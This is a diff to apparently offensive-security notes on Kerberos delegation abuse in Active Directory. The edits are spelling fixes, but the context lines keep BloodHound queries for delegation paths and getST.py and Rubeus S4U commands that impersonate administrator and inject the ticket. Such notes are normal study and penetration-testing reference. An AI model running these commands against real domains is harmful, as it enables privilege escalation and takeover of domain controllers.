@@ -78,7 +78,7 @@ MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
 MATCH (u:User {owned:true}), (c:Computer {name: "<MYTARGET.FQDN>"}), p=shortestPath((u)-[*1..]->(c)) RETURN p
 ```
 
-#### Constrained delegation can be set on the _frontend server_ (e.g. IIS) to allow it to delegate to _only selected backend services_ (e.g. MSSQL) on behalf of the user.
+#### Constrained delegation can be set on the _front-end server_ (e.g. IIS) to allow it to delegate to _only selected back-end services_ (e.g. MSSQL) on behalf of the user.
 
 <mark style="color:green;">DACL UAC property:</mark> <mark style="color:green;">`TrustedToAuthForDelegation`</mark>.&#x20;
 
@@ -135,7 +135,7 @@ ls \\dc01.offense.local\c$
 
 {% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution" %}
 
-### <mark style="color:orange;">Kerberos Delegation vs Resource Based Kerberos Delegation</mark>
+### <mark style="color:orange;">Kerberos Delegation vs Resource-based Kerberos Delegation</mark>
 
 * In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;
 * In resource based Kerberos delegation, computers (resources) specify who they trust and who can delegate authentications to them.
@@ -147,7 +147,7 @@ getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impe
 rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 
-**Resource-Based Constrained Delegation (RBCD) configures the **_**backend server**_** (e.g. MSSQL) to allow **_**only selected frontend services**_** (e.g. IIS) to delegate on behalf of the user. This makes it easier for specific server administrators to configure delegation, without requiring domain admin privileges.**
+**Resource-Based Constrained Delegation (RBCD) configures the **_**back-end server**_** (e.g. MSSQL) to allow **_**only selected front-end services**_** (e.g. IIS) to delegate on behalf of the user. This makes it easier for specific server administrators to configure delegation, without requiring domain admin privileges.**
 
 <mark style="color:green;">DACL Property:</mark> <mark style="color:green;"></mark><mark style="color:green;">`msDS-AllowedToActOnBehalfOfOtherIdentity`</mark><mark style="color:green;">.</mark>
 
